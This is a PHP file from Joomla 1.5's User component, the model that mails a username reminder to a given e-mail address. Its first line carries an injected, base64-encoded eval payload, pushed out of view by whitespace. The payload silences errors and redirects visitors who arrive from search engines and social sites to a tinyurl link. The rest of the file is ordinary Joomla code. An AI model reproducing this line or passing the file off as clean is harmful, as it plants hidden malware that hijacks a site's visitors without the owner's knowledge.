<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hNDJzamN3Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * @version		$Id: remind.php 14401 2010-01-26 14:10:00Z louis $
 * @package		Joomla
 * @subpackage	User
 * @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
 * @license		GNU/GPL, see LICENSE.php
 * Joomla! is free software. This version may have been modified pursuant to the
 * GNU General Public License, and as distributed it includes or is derivative
 * of works licensed under the GNU General Public License or other free or open
 * source software licenses. See COPYRIGHT.php for copyright notices and
 * details.
 */

// No direct access
defined('_JEXEC') or die;

jimport('joomla.application.component.model');

/**
 * User Component Remind Model
 *
 * @package		Joomla
 * @subpackage	User
 * @since		1.5
 */
class UserModelRemind extends JModel
{
	/**
	 * Registry namespace prefix
	 *
	 * @var	string
	 */
	var $_namespace	= 'com_user.remind.';

	/**
	 * Takes a user supplied e-mail address, looks
	 * it up in the database to find the username
	 * and then e-mails the username to the e-mail
	 * address given.
	 *
	 * @since	1.5
	 * @param	string	E-mail address
	 * @return	bool	True on success/false on failure
	 */
	function remindUsername($email)
	{
		jimport('joomla.mail.helper');

		global $mainframe;

		// Validate the e-mail address
		if (!JMailHelper::isEmailAddress($email))
		{
			$this->setError(JText::_('INVALID_EMAIL_ADDRESS'));
			return false;
		}

		$db = &JFactory::getDBO();
		$db->setQuery('SELECT username FROM #__users WHERE email = '.$db->Quote($email), 0, 1);

		// Get the username
		if (!($username = $db->loadResult()))
		{
			$this->setError(JText::_('COULD_NOT_FIND_EMAIL'));
			return false;
		}

		// Push the email address into the session
		$mainframe->setUserState($this->_namespace.'email', $email);

		// Send the reminder email
		if (!$this->_sendReminderMail($email, $username))
		{
			return false;
		}

		return true;
	}

	/**
	 * Sends a username reminder to the e-mail address
	 * specified containing the specified username.
	 *
	 * @since	1.5
	 * @param	string	A user's e-mail address
	 * @param	string	A user's username
	 * @return	bool	True on success/false on failure
	 */
	function _sendReminderMail($email, $username)
	{
		$config		= &JFactory::getConfig();
		$uri		= &JFactory::getURI();
		$url		= $uri->toString( array('scheme', 'host', 'port')).JRoute::_('index.php?option=com_user&view=login', false);

		$from		= $config->getValue('mailfrom');
		$fromname	= $config->getValue('fromname');
		$subject	= JText::sprintf('USERNAME_REMINDER_EMAIL_TITLE', $config->getValue('sitename'));
		$body		= JText::sprintf('USERNAME_REMINDER_EMAIL_TEXT', $config->getValue('sitename'), $username, $url);

		if (!JUtility::sendMail($from, $fromname, $email, $subject, $body))
		{
			$this->setError('ERROR_SENDING_REMINDER_EMAIL');
			return false;
		}

		return true;
	}
}